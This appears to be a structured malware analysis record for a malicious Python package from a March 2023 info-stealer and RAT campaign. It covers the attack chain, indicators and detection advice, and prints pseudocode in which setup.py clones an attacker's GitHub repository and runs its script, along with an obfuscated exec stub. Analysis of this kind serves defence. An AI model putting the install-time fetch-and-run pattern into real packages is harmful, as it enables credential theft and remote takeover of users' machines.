package_info.package_versions: unknown (latest at time of report, March 2023)
package_info.why_malicious: The package executes a multi-stage info-stealer and remote access trojan (RAT) payload by downloading and running obfuscated Python scripts from an attacker-controlled GitHub repository. These scripts establish persistence, exfiltrate sensitive data (browser credentials, cookies, credit cards, Discord tokens, Steam files, screenshots), and provide remote shell access, all without user consent. The package is part of a malware-as-a-service (MaaS) campaign.

malicious_snippets.code_snippet:
# (Pseudocode, as actual code is not shown)
# Clone GitHub repository and execute file
subprocess.run(['git', 'clone', 'https://github.com/NotInfected/REPO'])
subprocess.run(['python', 'bypass.py'])
malicious_snippets.code_behavior: During installation, the setup.py script clones a remote GitHub repository and executes a Python file (bypass.py) from it.

malice_analysis.why_suspicious: setup.py should not clone and execute remote code during installation. This behavior allows attackers to deliver arbitrary payloads and bypass static analysis.
malice_analysis.violated_expectations: Normal setup.py scripts only handle package installation, not remote code execution.
malice_analysis.similar_legitimate_use: Some legitimate packages may download dependencies, but never execute arbitrary scripts from untrusted sources.
key_indicators: Cloning and executing code from external repository
Execution of arbitrary Python files during install

malicious_snippets.code_snippet:
# Obfuscated: exec(''.join([chr(x) for x in [99, 111, 100, 101, ...]]))
# Deobfuscated core logic:
def add_to_startup():
    # Adds WindowsDefender.py to Windows startup via registry and startup folder
    ...
    subprocess.run(['python', 'WindowsDefender.py'])
malicious_snippets.code_behavior: Establishes persistence by adding WindowsDefender.py to Windows startup (registry and startup folder) and executes it.

malice_analysis.why_suspicious: Persistence mechanisms in install-time scripts are a hallmark of malware. Obfuscation is used to evade detection.
malice_analysis.violated_expectations: Legitimate packages do not modify system startup or registry entries during installation.
malice_analysis.similar_legitimate_use: Enterprise software may add itself to startup, but never via obfuscated, remotely-fetched scripts.

malicious_snippets.code_behavior: Steals sensitive data (Discord tokens, browser credentials, cookies, credit cards, Steam files, screenshots) and exfiltrates it to an attacker's Discord webhook.

malice_analysis.why_suspicious: Comprehensive data theft and exfiltration to a remote server (Discord webhook) is a clear sign of info-stealer malware.
malice_analysis.violated_expectations: Legitimate software never collects or exfiltrates such a wide range of sensitive user data.
malice_analysis.similar_legitimate_use: Security tools may access some of this data for backup or migration, but never exfiltrate it to third-party servers.
key_indicators: Access to browser storage and decryption routines
Use of Discord webhook for exfiltration

execution_context.trigger: runtime (when __main__.py is executed, e.g., as a command or via bot command)

malicious_snippets.code_behavior: Implements a Discord bot that allows attackers to remotely execute commands, steal data, and control the infected machine via Discord messages.

malice_analysis.why_suspicious: Remote command execution via Discord bot is a classic RAT (remote access trojan) technique. This enables full attacker control.
malice_analysis.violated_expectations: Legitimate bots do not run on user machines as system-level agents, nor do they exfiltrate data or execute arbitrary commands.
malice_analysis.similar_legitimate_use: Legitimate Discord bots run on servers, not as malware on user endpoints.
key_indicators: Shell command execution and data exfiltration

attack_chain.action: User installs the reverse-shell package via pip, triggering setup.py.
attack_chain.leads_to: Cloning and execution of bypass.py from attacker's GitHub

attack_chain.action: bypass.py establishes persistence by adding WindowsDefender.py to startup and executes it.
attack_chain.leads_to: WindowsDefender.py runs at startup and begins data theft

attack_chain.action: WindowsDefender.py steals sensitive data (browser, Discord, Steam, screenshots) and exfiltrates to Discord webhook.
attack_chain.leads_to: Attacker receives stolen data; maintains access

attack_chain.action: If the RAT component (syntax/__main__.py) is present, attacker can remotely control the infected machine via Discord bot commands.
attack_chain.leads_to: Ongoing remote access and further exploitation

Persistence via Windows registry and startup folder modifications

Exfiltration of data to Discord webhooks
Discord bot logic enabling remote command execution

detection_knowledge.how_to_detect: Monitor for Python package installations that clone and execute code from external repositories during setup. Flag any use of obfuscated exec/chr code patterns. Detect modifications to Windows startup (registry and startup folder) by Python processes. Watch for processes accessing browser credential stores, taking screenshots, or zipping Steam directories. Alert on outbound connections to Discord webhooks or suspicious GitHub repositories. Look for Discord bot logic running on endpoints, especially if it enables remote command execution.
